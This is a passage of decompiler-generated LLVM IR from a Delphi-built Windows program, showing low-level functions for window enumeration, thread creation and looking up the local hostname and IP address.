  %18 = icmp eq i1 %17, false, !insn.addr !1873
  %19 = icmp eq i1 %18, false, !insn.addr !1874
  br i1 %19, label %dec_label_pc_406f9a, label %dec_label_pc_406f8f, !insn.addr !1874

dec_label_pc_406f8f:                              ; preds = %dec_label_pc_406f70
  %20 = call i32 @function_40441c(), !insn.addr !1875
  %21 = sub i32 %20, %6, !insn.addr !1876
  %22 = icmp ugt i32 %21, %arg2, !insn.addr !1877
  %23 = icmp eq i1 %22, false, !insn.addr !1878
  store i32 %15, i32* %esp.0.reg2mem, !insn.addr !1878
  br i1 %23, label %dec_label_pc_406f70, label %dec_label_pc_406f9a, !insn.addr !1878

dec_label_pc_406f9a:                              ; preds = %dec_label_pc_406f8f, %dec_label_pc_406f70
  ret i32 0, !insn.addr !1879
}

define i32 @function_406fb4() local_unnamed_addr {
dec_label_pc_406fb4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8, !insn.addr !1880
  %.off = add i8 %1, -33
  %2 = icmp ult i8 %.off, 94
  %storemerge = sext i1 %2 to i32
  ret i32 %storemerge, !insn.addr !1881
}

define i32 @function_406fcc(i32 %arg1) local_unnamed_addr {
dec_label_pc_406fcc:
  %ecx.1.reg2mem = alloca i32, !insn.addr !1882
  %edi.0.reg2mem = alloca i32, !insn.addr !1882
  %ecx.0.reg2mem = alloca i32, !insn.addr !1882
  %0 = call i1 @__decompiler_undefined_function_1()
  %1 = select i1 %0, i32 -1, i32 1
  store i32 -1, i32* %ecx.0.reg2mem, !insn.addr !1883
  br label %2, !insn.addr !1883

; <label>:2:                                      ; preds = %4, %dec_label_pc_406fcc
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %3 = icmp eq i32 %ecx.0.reload, 0, !insn.addr !1883
  store i32 0, i32* %ecx.1.reg2mem, !insn.addr !1883
  br i1 %3, label %10, label %4, !insn.addr !1883

; <label>:4:                                      ; preds = %2
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %5 = inttoptr i32 %edi.0.reload to i8*, !insn.addr !1883
  %6 = load i8, i8* %5, align 1, !insn.addr !1883
  %7 = icmp eq i8 %6, 0, !insn.addr !1883
  %8 = add i32 %edi.0.reload, %1, !insn.addr !1883
  %9 = add i32 %ecx.0.reload, -1, !insn.addr !1883
  store i32 %9, i32* %ecx.0.reg2mem, !insn.addr !1883
  store i32 %8, i32* %edi.0.reg2mem, !insn.addr !1883
  store i32 %9, i32* %ecx.1.reg2mem, !insn.addr !1883
  br i1 %7, label %10, label %2, !insn.addr !1883

; <label>:10:                                     ; preds = %2, %4
  %ecx.1.reload = load i32, i32* %ecx.1.reg2mem
  %11 = sub i32 -2, %ecx.1.reload, !insn.addr !1884
  ret i32 %11, !insn.addr !1885
}

declare i32 @StrPas() local_unnamed_addr

declare i32 @StrCopy() local_unnamed_addr

define i32 @function_407020() local_unnamed_addr {
dec_label_pc_407020:
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-284 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-284 to i32, !insn.addr !1886
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1887
  %3 = call i32 @SendMessageA(i32* %2, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1887
  %4 = add i32 %3, %1, !insn.addr !1888
  %5 = inttoptr i32 %4 to i8*, !insn.addr !1888
  store i8 0, i8* %5, align 1, !insn.addr !1888
  %6 = call i32 @"@LStrFromArray"(), !insn.addr !1889
  ret i32 %6, !insn.addr !1890
}

define i32 @function_407054() local_unnamed_addr {
dec_label_pc_407054:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-284 = alloca i32, align 4
  %2 = inttoptr i32 %0 to i8*, !insn.addr !1891
  %3 = ptrtoint i32* %stack_var_-284 to i32, !insn.addr !1892
  %4 = inttoptr i32 %1 to i32*, !insn.addr !1893
  %5 = call i32 @GetClassNameA(i32* %4, i8* %2, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1893
  %6 = add i32 %5, %3, !insn.addr !1894
  %7 = inttoptr i32 %6 to i8*, !insn.addr !1894
  store i8 0, i8* %7, align 1, !insn.addr !1894
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !1895
  ret i32 %8, !insn.addr !1896
}

define i32 @function_40708c() local_unnamed_addr {
dec_label_pc_40708c:
  %0 = call i32 @function_4034c8(), !insn.addr !1897
  %1 = call i32 @function_4034c8(), !insn.addr !1898
  %2 = call i32 @"@LStrCopy"(), !insn.addr !1899
  ret i32 %2, !insn.addr !1900
}

define i32 @function_4070cc() local_unnamed_addr {
dec_label_pc_4070cc:
  %0 = call i32 @function_4034c8(), !insn.addr !1901
  %1 = call i32 @"@LStrCopy"(), !insn.addr !1902
  ret i32 %1, !insn.addr !1903
}

define i32 @function_407104() local_unnamed_addr {
dec_label_pc_407104:
  %0 = call i32 @function_4036c8(), !insn.addr !1904
  %1 = call i32 @function_4036c8(), !insn.addr !1905
  %2 = call i32 @CompareStringA(i32 %1, i32 1, i8* inttoptr (i32 1024 to i8*), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1906
  %3 = icmp eq i32 %2, 2, !insn.addr !1907
  %4 = zext i1 %3 to i32, !insn.addr !1908
  %5 = and i32 %2, -256, !insn.addr !1908
  %6 = or i32 %5, %4, !insn.addr !1908
  ret i32 %6, !insn.addr !1909
}

define i32 @function_407134() local_unnamed_addr {
dec_label_pc_407134:
  %.lcssa.reg2mem = alloca i32*, !insn.addr !1910
  %esp.0.lcssa.reg2mem = alloca i32, !insn.addr !1910
  %esp.02.reg2mem = alloca i32, !insn.addr !1910
  %storemerge3.reg2mem = alloca i32, !insn.addr !1910
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !1911
  store i32 %1, i32* %stack_var_-32, align 4, !insn.addr !1911
  %2 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !1911
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !1912
  %3 = ptrtoint i32* %stack_var_-36 to i32, !insn.addr !1913
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1914
  %5 = call i32* @GetTopWindow(i32* %4), !insn.addr !1914
  %storemerge1 = ptrtoint i32* %5 to i32
  %6 = add i32 %3, -4, !insn.addr !1915
  %7 = inttoptr i32 %6 to i32*, !insn.addr !1915
  store i32 %storemerge1, i32* %7, align 4, !insn.addr !1915
  %8 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1916
  %9 = icmp eq i1 %8, false, !insn.addr !1917
  %10 = icmp eq i1 %9, false, !insn.addr !1918
  store i32 %storemerge1, i32* %storemerge3.reg2mem, !insn.addr !1918
  store i32 %3, i32* %esp.02.reg2mem, !insn.addr !1918
  store i32 %3, i32* %esp.0.lcssa.reg2mem, !insn.addr !1918
  store i32* %7, i32** %.lcssa.reg2mem, !insn.addr !1918
  br i1 %10, label %dec_label_pc_407158, label %dec_label_pc_407198, !insn.addr !1918

dec_label_pc_407158:                              ; preds = %dec_label_pc_407134, %dec_label_pc_407158
  %esp.02.reload = load i32, i32* %esp.02.reg2mem
  %storemerge3.reload = load i32, i32* %storemerge3.reg2mem
  %11 = call i32 @function_407020(), !insn.addr !1919
  %12 = call i32 @function_407134(), !insn.addr !1920
  %13 = add i32 %esp.02.reload, -8, !insn.addr !1921
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1921
  store i32 2, i32* %14, align 4, !insn.addr !1921
  %15 = add i32 %esp.02.reload, -12, !insn.addr !1922
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1922
  store i32 %storemerge3.reload, i32* %16, align 4, !insn.addr !1922
  %17 = call i32* @GetWindow(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1923
  %storemerge = ptrtoint i32* %17 to i32
  %18 = add i32 %esp.02.reload, -16, !insn.addr !1915
  %19 = inttoptr i32 %18 to i32*
  store i32 %storemerge, i32* %19, align 4, !insn.addr !1915
  %20 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1916
  %21 = icmp eq i1 %20, false, !insn.addr !1917
  %22 = icmp eq i1 %21, false, !insn.addr !1918
  store i32 %storemerge, i32* %storemerge3.reg2mem, !insn.addr !1918
  store i32 %15, i32* %esp.02.reg2mem, !insn.addr !1918
  store i32 %15, i32* %esp.0.lcssa.reg2mem, !insn.addr !1918
  store i32* %19, i32** %.lcssa.reg2mem, !insn.addr !1918
  br i1 %22, label %dec_label_pc_407158, label %dec_label_pc_407198, !insn.addr !1918

dec_label_pc_407198:                              ; preds = %dec_label_pc_407158, %dec_label_pc_407134
  %.lcssa.reload = load i32*, i32** %.lcssa.reg2mem
  %esp.0.lcssa.reload = load i32, i32* %esp.0.lcssa.reg2mem
  %23 = load i32, i32* %.lcssa.reload, align 4, !insn.addr !1924
  call void @__writefsdword(i32 0, i32 %23), !insn.addr !1925
  %24 = add i32 %esp.0.lcssa.reload, 4, !insn.addr !1926
  %25 = inttoptr i32 %24 to i32*, !insn.addr !1926
  store i32 4223413, i32* %25, align 4, !insn.addr !1926
  %26 = call i32 @"@LStrClr"(), !insn.addr !1927
  ret i32 %26, !insn.addr !1928
}

define i32 @function_4071ae() local_unnamed_addr {
dec_label_pc_4071ae:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1929
  ret i32 %0, !insn.addr !1929
}

define i32 @function_4071b3() local_unnamed_addr {
dec_label_pc_4071b3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1930
}

define i32 @function_4071b5(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4071b5:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1931
}

define i32 @function_4071c0() local_unnamed_addr {
dec_label_pc_4071c0:
  %stack_var_-28 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1932
  store i32 %0, i32* %stack_var_-28, align 4, !insn.addr !1932
  %1 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !1932
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1933
  %2 = call i32 @function_407054(), !insn.addr !1934
  %3 = call i32 @"@LStrCmp"(), !insn.addr !1935
  %4 = call i32 @function_407134(), !insn.addr !1936
  %5 = load i32, i32* %stack_var_-28, align 4, !insn.addr !1937
  call void @__writefsdword(i32 0, i32 %5), !insn.addr !1938
  %6 = call i32 @"@LStrClr"(), !insn.addr !1939
  ret i32 %6, !insn.addr !1940
}

define i32 @function_407221() local_unnamed_addr {
dec_label_pc_407221:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1941
  ret i32 %0, !insn.addr !1941
}

define i32 @function_407226() local_unnamed_addr {
dec_label_pc_407226:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1942
}

define i32 @function_407228(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_407228:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1943
}

define i32 @function_407243() local_unnamed_addr {
dec_label_pc_407243:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %3 = add i32 %0, 1, !insn.addr !1944
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1944
  store i32 %3, i32* %4, align 4, !insn.addr !1944
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1945
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1945
  %9 = add i8 %6, %8, !insn.addr !1945
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1945
  store i8 %9, i8* %10, align 1, !insn.addr !1945
  %11 = add i32 %2, 81, !insn.addr !1946
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1946
  %13 = load i8, i8* %12, align 1, !insn.addr !1946
  %14 = trunc i32 %1 to i8, !insn.addr !1946
  %15 = add i8 %13, %14, !insn.addr !1946
  store i8 %15, i8* %12, align 1, !insn.addr !1946
  %16 = load i32, i32* %eax, align 4, !insn.addr !1947
  ret i32 %16, !insn.addr !1947
}

define x86_fp80 @function_40724b() local_unnamed_addr {
dec_label_pc_40724b:
  %0 = call x86_fp80 @__decompiler_undefined_function_11()
  %1 = fadd x86_fp80 %0, %0, !insn.addr !1948
  ret x86_fp80 %1, !insn.addr !1949
}

define i32 @function_407250() local_unnamed_addr {
dec_label_pc_407250:
  %esp.1.in.reg2mem = alloca i32*, !insn.addr !1950
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !1951
  store i32 %1, i32* %stack_var_-24, align 4, !insn.addr !1951
  %2 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !1951
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !1952
  %3 = call i32 @function_407054(), !insn.addr !1953
  %4 = call i32 @"@LStrCmp"(), !insn.addr !1954
  %5 = call i32 @GetWindowLongA(i32* inttoptr (i32 -12 to i32*), i32 %0), !insn.addr !1955
  %6 = icmp eq i32 %5, 180, !insn.addr !1956
  store i32* %stack_var_-32, i32** %esp.1.in.reg2mem, !insn.addr !1957
  br i1 %6, label %dec_label_pc_4072b3, label %dec_label_pc_40728e, !insn.addr !1957

dec_label_pc_40728e:                              ; preds = %dec_label_pc_407250
  %7 = call i32 @GetWindowLongA(i32* inttoptr (i32 -16 to i32*), i32 %0), !insn.addr !1958
  %8 = and i32 %7, 32
  %9 = icmp eq i32 %8, 0, !insn.addr !1959
  %10 = icmp eq i1 %9, false, !insn.addr !1960
  store i32* %stack_var_-40, i32** %esp.1.in.reg2mem, !insn.addr !1960
  br i1 %10, label %dec_label_pc_4072b3, label %dec_label_pc_40729a, !insn.addr !1960

dec_label_pc_40729a:                              ; preds = %dec_label_pc_40728e
  %11 = call i32 @SendMessageA(i32* null, i32 0, i32 210, i32 %0), !insn.addr !1961
  store i32* %stack_var_-56, i32** %esp.1.in.reg2mem
  br label %dec_label_pc_4072b3

dec_label_pc_4072b3:                              ; preds = %dec_label_pc_40729a, %dec_label_pc_407250, %dec_label_pc_40728e
  %esp.1.in.reload = load i32*, i32** %esp.1.in.reg2mem
  %esp.1 = ptrtoint i32* %esp.1.in.reload to i32
  %12 = load i32, i32* %esp.1.in.reload, align 4, !insn.addr !1962
  call void @__writefsdword(i32 0, i32 %12), !insn.addr !1963
  %13 = add i32 %esp.1, 8, !insn.addr !1964
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1964
  store i32 4223702, i32* %14, align 4, !insn.addr !1964
  %15 = call i32 @"@LStrClr"(), !insn.addr !1965
  ret i32 %15, !insn.addr !1966
}

define i32 @function_4072cf() local_unnamed_addr {
dec_label_pc_4072cf:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1967
  ret i32 %0, !insn.addr !1967
}

define i32 @function_4072d4() local_unnamed_addr {
dec_label_pc_4072d4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1968
}

define i32 @function_4072d6(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4072d6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1969
}

define i32 @function_4072ec() local_unnamed_addr {
dec_label_pc_4072ec:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1970
  %3 = call i32* @GetDC(i32* %2), !insn.addr !1970
  %4 = ptrtoint i32* %3 to i32, !insn.addr !1970
  %5 = call i32 @SendMessageA(i32* null, i32 0, i32 49, i32 %1), !insn.addr !1971
  %6 = inttoptr i32 %5 to i32*, !insn.addr !1972
  %7 = call i32* @SelectObject(i32* %6, i32* %3), !insn.addr !1972
  %8 = call i1 @GetCharWidthA(i32* nonnull %stack_var_-40, i32 42, i32 42, i32* %3), !insn.addr !1973
  %9 = call i32* @GetStockObject(i32 10), !insn.addr !1974
  %10 = call i32* @SelectObject(i32* %9, i32* %3), !insn.addr !1975
  %11 = inttoptr i32 %1 to i32*, !insn.addr !1976
  %12 = call i32 @ReleaseDC(i32* %3, i32* %11), !insn.addr !1976
  %13 = bitcast i32* %stack_var_-84 to %tagPOINT*
  %14 = call i1 @GetCaretPos(%tagPOINT* nonnull %13), !insn.addr !1977
  %15 = ptrtoint i32* %stack_var_-84 to i32, !insn.addr !1978
  %16 = ashr i32 %15, 31, !insn.addr !1979
  %17 = zext i32 %15 to i64, !insn.addr !1980
  %18 = zext i32 %16 to i64, !insn.addr !1980
  %19 = mul i64 %18, 4294967296, !insn.addr !1980
  %20 = or i64 %19, %17, !insn.addr !1980
  %21 = zext i32 %4 to i64, !insn.addr !1980
  %22 = sdiv i64 %20, %21, !insn.addr !1980
  %23 = trunc i64 %22 to i32, !insn.addr !1980
  ret i32 %23, !insn.addr !1981
}

define i32 @function_407348() local_unnamed_addr {
dec_label_pc_407348:
  %esp.0.reg2mem = alloca i32, !insn.addr !1982
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1983
  store i32 %0, i32* %stack_var_-28, align 4, !insn.addr !1983
  %1 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !1983
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1984
  %2 = load i32, i32* @global_var_408154, align 4, !insn.addr !1985
  %3 = icmp eq i32 %2, 0, !insn.addr !1985
  br i1 %3, label %dec_label_pc_407384, label %dec_label_pc_407371, !insn.addr !1986

dec_label_pc_407371:                              ; preds = %dec_label_pc_407348
  %4 = inttoptr i32 %2 to i32*, !insn.addr !1987
  store i32 0, i32* %4, align 4, !insn.addr !1987
  br label %dec_label_pc_407384, !insn.addr !1988

dec_label_pc_407384:                              ; preds = %dec_label_pc_407371, %dec_label_pc_407348
  %5 = load i32, i32* @global_var_40813c, align 4, !insn.addr !1989
  %6 = icmp eq i32 %5, 0, !insn.addr !1989
  br i1 %6, label %dec_label_pc_407398, label %dec_label_pc_40738e, !insn.addr !1990

dec_label_pc_40738e:                              ; preds = %dec_label_pc_407384
  %7 = load i32, i32* @global_var_408140, align 4, !insn.addr !1991
  %8 = icmp eq i32 %7, 0, !insn.addr !1991
  %9 = icmp eq i1 %8, false, !insn.addr !1992
  br i1 %9, label %dec_label_pc_4073a2, label %dec_label_pc_407398, !insn.addr !1992

dec_label_pc_407398:                              ; preds = %dec_label_pc_40738e, %dec_label_pc_407384
  %10 = call i32 @function_40747c(), !insn.addr !1993
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1994
  br label %dec_label_pc_40743f, !insn.addr !1994

dec_label_pc_4073a2:                              ; preds = %dec_label_pc_40738e
  %11 = load i8, i8* bitcast (i32** @global_var_408160 to i8*), align 4, !insn.addr !1995
  %12 = icmp eq i8 %11, 0, !insn.addr !1995
  br i1 %12, label %dec_label_pc_4073cb, label %dec_label_pc_4073ac, !insn.addr !1996

dec_label_pc_4073ac:                              ; preds = %dec_label_pc_4073a2
  %13 = call i32 @function_406c64(), !insn.addr !1997
  %14 = icmp eq i32 %13, 0, !insn.addr !1998
  br i1 %14, label %dec_label_pc_4073cb, label %dec_label_pc_4073c4, !insn.addr !1999

dec_label_pc_4073c4:                              ; preds = %dec_label_pc_4073ac
  %15 = call i32 @function_40747c(), !insn.addr !2000
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !2001
  br label %dec_label_pc_40743f, !insn.addr !2001

dec_label_pc_4073cb:                              ; preds = %dec_label_pc_4073ac, %dec_label_pc_4073a2
  %16 = call i32 @"@LStrCatN"(), !insn.addr !2002
  %17 = call i32 @"@LStrAsg"(), !insn.addr !2003
  %18 = bitcast i32* %stack_var_-12 to %_SECURITY_ATTRIBUTES*
  %19 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* inttoptr (i32 2 to i32 (i32*)*), i32* inttoptr (i32 4219720 to i32*), i32 0, i32* null), !insn.addr !2004
  %20 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* inttoptr (i32 1 to i32 (i32*)*), i32* inttoptr (i32 4219720 to i32*), i32 0, i32* null), !insn.addr !2005
  store i32 0, i32* %stack_var_-112, align 4, !insn.addr !2006
  %21 = ptrtoint i32* %stack_var_-112 to i32, !insn.addr !2006
  %22 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* null, i32* inttoptr (i32 4219720 to i32*), i32 0, i32* null), !insn.addr !2007
  %23 = call i32 @function_40747c(), !insn.addr !2008
  store i32 %21, i32* %esp.0.reg2mem, !insn.addr !2008
  br label %dec_label_pc_40743f, !insn.addr !2008

dec_label_pc_40743f:                              ; preds = %dec_label_pc_4073cb, %dec_label_pc_4073c4, %dec_label_pc_407398
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %24 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !2009
  %25 = load i32, i32* %24, align 4, !insn.addr !2009
  call void @__writefsdword(i32 0, i32 %25), !insn.addr !2010
  %26 = add i32 %esp.0.reload, 8, !insn.addr !2011
  %27 = inttoptr i32 %26 to i32*, !insn.addr !2011
  store i32 4224092, i32* %27, align 4, !insn.addr !2011
  %28 = call i32 @"@LStrClr"(), !insn.addr !2012
  ret i32 %28, !insn.addr !2013
}

define i32 @function_407455() local_unnamed_addr {
dec_label_pc_407455:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2014
  ret i32 %0, !insn.addr !2014
}

define i32 @function_40745a() local_unnamed_addr {
dec_label_pc_40745a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2015
}

define i32 @function_40745c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_40745c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2016
}

define i32 @function_40747c() local_unnamed_addr {
dec_label_pc_40747c:
  %0 = call i32 @"@LStrClr"(), !insn.addr !2017
  %1 = call i32 @"@LStrClr"(), !insn.addr !2018
  ret i32 %1, !insn.addr !2019
}

define i32 @function_407494() local_unnamed_addr {
dec_label_pc_407494:
  %eax.0.reg2mem = alloca i32, !insn.addr !2020
  %esp.0.reg2mem = alloca i32, !insn.addr !2020
  %esp.15.reg2mem = alloca i32, !insn.addr !2020
  %storemerge6.reg2mem = alloca i32, !insn.addr !2020
  %.reg2mem = alloca i32, !insn.addr !2020
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-500 = alloca i8*, align 4
  %stack_var_-496 = alloca i32, align 4
  %stack_var_-488 = alloca i32, align 4
  %2 = trunc i32 %1 to i16, !insn.addr !2020
  %3 = inttoptr i32 %0 to %WSAData*, !insn.addr !2021
  store i32 257, i32* %stack_var_-488, align 4, !insn.addr !2022
  %4 = call i32 @WSAStartup(i16 %2, %WSAData* %3), !insn.addr !2023
  %5 = call i32 @"@LStrClr"(), !insn.addr !2024
  %6 = ptrtoint i32* %stack_var_-488 to i32, !insn.addr !2025
  store i32 %6, i32* %stack_var_-496, align 4, !insn.addr !2025
  %7 = call i32 @gethostname(i8* inttoptr (i32 64 to i8*), i32 %6), !insn.addr !2026
  %8 = bitcast i32* %stack_var_-496 to i8*
  store i8* %8, i8** %stack_var_-500, align 4, !insn.addr !2027
  %9 = call %hostent* @gethostbyname(i8* nonnull %8), !insn.addr !2028
  %10 = ptrtoint %hostent* %9 to i32, !insn.addr !2028
  %11 = icmp eq %hostent* %9, null, !insn.addr !2029
  store i32 %10, i32* %eax.0.reg2mem, !insn.addr !2030
  br i1 %11, label %dec_label_pc_4074f2, label %dec_label_pc_4074cc, !insn.addr !2030

dec_label_pc_4074cc:                              ; preds = %dec_label_pc_407494
  %12 = add i32 %10, 12, !insn.addr !2031
  %13 = inttoptr i32 %12 to i32*, !insn.addr !2031
  %14 = load i32, i32* %13, align 4, !insn.addr !2031
  %15 = inttoptr i32 %14 to i32*, !insn.addr !2032
  %16 = load i32, i32* %15, align 4, !insn.addr !2032
  %17 = icmp eq i32 %16, 0, !insn.addr !2033
  %18 = icmp eq i1 %17, false, !insn.addr !2034
  br i1 %18, label %dec_label_pc_4074d3.lr.ph, label %dec_label_pc_4074ed, !insn.addr !2034

dec_label_pc_4074d3.lr.ph:                        ; preds = %dec_label_pc_4074cc
  %19 = ptrtoint i8** %stack_var_-500 to i32, !insn.addr !2027
  store i32 %16, i32* %.reg2mem
  store i32 0, i32* %storemerge6.reg2mem
  store i32 %19, i32* %esp.15.reg2mem
  br label %dec_label_pc_4074d3

dec_label_pc_4074d3:                              ; preds = %dec_label_pc_4074d3.lr.ph, %dec_label_pc_4074e5
  %esp.15.reload = load i32, i32* %esp.15.reg2mem
  %storemerge6.reload = load i32, i32* %storemerge6.reg2mem
  %20 = icmp eq i32 %storemerge6.reload, 0, !insn.addr !2035
  %21 = icmp eq i1 %20, false, !insn.addr !2036
  store i32 %esp.15.reload, i32* %esp.0.reg2mem, !insn.addr !2036
  br i1 %21, label %dec_label_pc_4074e5, label %dec_label_pc_4074d7, !insn.addr !2036

dec_label_pc_4074d7:                              ; preds = %dec_label_pc_4074d3
  %.reload = load i32, i32* %.reg2mem
  %22 = inttoptr i32 %.reload to i32*, !insn.addr !2037
  %23 = load i32, i32* %22, align 4, !insn.addr !2037
  %24 = add i32 %esp.15.reload, -4, !insn.addr !2037
  %25 = inttoptr i32 %24 to i32*, !insn.addr !2037
  store i32 %23, i32* %25, align 4, !insn.addr !2037
  %26 = call i8* @inet_ntoa(%in_addr { i32 ptrtoint (i32* @0 to i32) }), !insn.addr !2038
  %27 = call i32 @StrPas(), !insn.addr !2039
  store i32 %24, i32* %esp.0.reg2mem, !insn.addr !2039
  br label %dec_label_pc_4074e5, !insn.addr !2039

dec_label_pc_4074e5:                              ; preds = %dec_label_pc_4074d7, %dec_label_pc_4074d3
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %28 = add i32 %storemerge6.reload, 1, !insn.addr !2040
  %29 = mul i32 %28, 4, !insn.addr !2032
  %30 = add i32 %29, %14, !insn.addr !2032
  %31 = inttoptr i32 %30 to i32*, !insn.addr !2032
  %32 = load i32, i32* %31, align 4, !insn.addr !2032
  %33 = icmp eq i32 %32, 0, !insn.addr !2033
  %34 = icmp eq i1 %33, false, !insn.addr !2034
  store i32 %32, i32* %.reg2mem, !insn.addr !2034
  store i32 %28, i32* %storemerge6.reg2mem, !insn.addr !2034
  store i32 %esp.0.reload, i32* %esp.15.reg2mem, !insn.addr !2034
  br i1 %34, label %dec_label_pc_4074d3, label %dec_label_pc_4074ed, !insn.addr !2034

dec_label_pc_4074ed:                              ; preds = %dec_label_pc_4074e5, %dec_label_pc_4074cc
  %35 = call i32 @WSACleanup(), !insn.addr !2041
  store i32 %35, i32* %eax.0.reg2mem, !insn.addr !2041
  br label %dec_label_pc_4074f2, !insn.addr !2041

dec_label_pc_4074f2:                              ; preds = %dec_label_pc_4074ed, %dec_label_pc_407494
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !2042
}

define i32 @function_407500() local_unnamed_addr {
dec_label_pc_407500:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2043
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !2043
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !2043
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2044
  %2 = load i32, i32* @global_var_4096e0, align 4, !insn.addr !2045
  %3 = add i32 %2, 1, !insn.addr !2045
  store i32 %3, i32* @global_var_4096e0, align 4, !insn.addr !2045
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !2046
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !2047
  ret i32 0, !insn.addr !2048
}

define i32 @function_407525() local_unnamed_addr {
dec_label_pc_407525:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2049
  ret i32 %0, !insn.addr !2049
}

define i32 @function_40752a() local_unnamed_addr {
dec_label_pc_40752a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2050
}

define i32 @function_40752c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40752c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2051
}

define i32 @function_407530() local_unnamed_addr {
dec_label_pc_407530:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096e0, align 4, !insn.addr !2052
  %2 = add i32 %1, -1, !insn.addr !2052
  store i32 %2, i32* @global_var_4096e0, align 4, !insn.addr !2052
  ret i32 %0, !insn.addr !2053
}

define i32 @function_407538(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407538:
